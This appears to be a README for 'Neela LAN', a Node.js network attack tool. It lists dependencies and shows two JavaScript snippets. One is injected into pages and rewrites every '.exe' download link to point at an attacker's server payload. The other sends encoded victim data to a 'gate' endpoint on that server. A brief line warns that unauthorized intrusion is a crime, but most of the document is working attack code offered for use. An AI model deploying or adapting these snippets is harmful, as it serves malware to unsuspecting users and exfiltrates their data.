![Neela LAN](https://s31.postimg.org/40czeg3zv/home.png)

###### Require:
    - express
    - body-parser
    - colors
    - cookie-parser
    - cookie-session
    - dns
    - ent
    - express-session
    - ip
    - socket.io
    - os
    - request-ip

##### Make Routine & Hack !
* /exploit/routine

```javascript
if(document.getElementsByTagName('a') !== undefined){
  var list = document.getElementsByTagName('a');
  for(var x = 0;x < list.length;x++){
    console.log(list[x].href);
    var current = list[x].href;
    if(current.indexOf('.exe') > -1){
      list[x].href = 'http://IP_SERVER:3000/payload'
    }
  }
}

```

##### Gate receipt

```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://SERV_IP:3000/gate/'+encoded, false);
req.send(null);
```
![Neela](https://s31.postimg.org/wdfic47wr/Capture_d_e_cran_2016_07_07_a_15_32_28.png)

##### Neela Logs

![Neela logs](https://s31.postimg.org/qgshncf17/logs.png)


reminder, infiltrate, monitor, computer system without authorization is a crime